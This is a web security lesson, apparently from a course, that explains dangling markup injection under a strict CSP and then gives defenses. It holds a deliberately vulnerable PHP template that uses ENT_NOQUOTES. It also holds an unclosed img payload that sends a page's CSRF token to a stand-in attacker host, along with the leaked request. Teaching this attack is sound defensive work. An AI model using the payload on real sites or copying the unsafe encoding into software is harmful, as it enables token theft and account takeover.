# 05 - Dangling Markup Injection: Stealing Sensitive Data without JavaScript

> 🌐 **Language / اللغة:** [English 🇬🇧](./05-dangling-markup-injection.md) | [العربية 🇸🇦](../ar/05-dangling-markup-injection.md)

---

## 📌 1. The Scenario: What if JavaScript is 100% Blocked?

Imagine an application protected by a military-grade **Content Security Policy (CSP)**:
```http
Content-Security-Policy: default-src 'self'; script-src 'none';
```
Any attempt to inject `<script>`, inline event handlers (`onerror=alert(1)`), or `javascript:` links will be instantly blocked by the browser.

Most developers assume the application is completely immune to client-side attacks. **They are wrong.**

Welcome to **Dangling Markup Injection**—a devastating attack that extracts CSRF tokens, passwords, and private user data using nothing more than an **unclosed HTML attribute!**

---

## ⚔️ 2. The Attack Mechanism

### The Vulnerable Server-Side Template:
Consider a profile page reflecting a user's first name, followed immediately by a sensitive hidden CSRF token:

```html
<p>Welcome back, <?= htmlspecialchars($firstName, ENT_NOQUOTES) ?>!</p>

<form action="/account/delete" method="POST">
    <input type="hidden" name="csrf_token" value="9f8a3c2e1b4d5e6f7a8b9c0d1e2f3a4b">
    <button type="submit">Delete Account</button>
</form>
```

### The Injected Dangling Payload:
The attacker sets their first name to an unclosed image tag with a dangling single quote:
```html
<img src='https://attacker-controlled.site/log?data=
```

### How the Browser Parses the Assembled DOM:
Because there is no closing single quote `'`, the browser's HTML parser treats **everything after the injection point as the literal `src` URL string** until it hits the next matching single quote or closing delimiter in the page:

```html
<p>Welcome back, <img src='https://attacker-controlled.site/log?data=!</p>

<form action="/account/delete" method="POST">
    <input type="hidden" name="csrf_token" value="9f8a3c2e1b4d5e6f7a8b9c0d1e2f3a4b">
    <button type="submit">Delete Account</button>
</form>'></p>
```

### The Resulting Network Request:
The browser attempts to render the image by firing an HTTP GET request to the attacker's server:
```http
GET /log?data=!%3C/p%3E%3Cform%20action=%22/account/delete%22%20method=%22POST%22%3E%3Cinput%20type=%22hidden%22%20name=%22csrf_token%22%20value=%229f8a3c2e1b4d5e6f7a8b9c0d1e2f3a4b%22 HTTP/1.1
Host: attacker-controlled.site
```
The attacker checks their web server access logs, copies the victim's secret CSRF token, and executes an account takeover—**without executing a single line of JavaScript!**

---

## 🛡️ 3. How to Defend Against Dangling Markup

### Defense 1: Full Contextual HTML Entity Encoding
Never use raw or unquoted reflection. Always encode quotes properly:
```php
// SECURE: Encodes both double and single quotes (&quot; and &#039;)
echo htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

### Defense 2: Restrict CSP Fetch Directives (`img-src`, `connect-src`)
Prevent arbitrary outbound resource requests:
```http
Content-Security-Policy: default-src 'self'; img-src 'self';
```
If the attacker injects an image pointing to `attacker-controlled.site`, the browser immediately blocks the request because the domain is not whitelisted!

---

## 🎯 Summary & Lesson Challenge

- Dangling Markup swallows downstream HTML content inside an unclosed attribute.
- It steals secret CSRF tokens and user data even when JavaScript is completely blocked.
- Mitigate with strict `ENT_QUOTES` encoding and restrictive CSP image/connection policies.

**Challenge:** In **[Lab 1: Guided Walkthrough](../Labs/Lab-1-Guided-Walkthrough/README.md)**, you will inspect an actual working application vulnerable to Dangling Markup, steal a simulated CSRF token, and implement the defense!

---

**Next Lesson:**  
➡️ [Lesson 06: CSS Data Exfiltration (Sniffing Passwords via Selectors)](./06-css-data-exfiltration.md) | ⬅️ [Lesson 04: Iframe Sandboxing](./04-iframe-sandboxing-and-clickjacking.md)
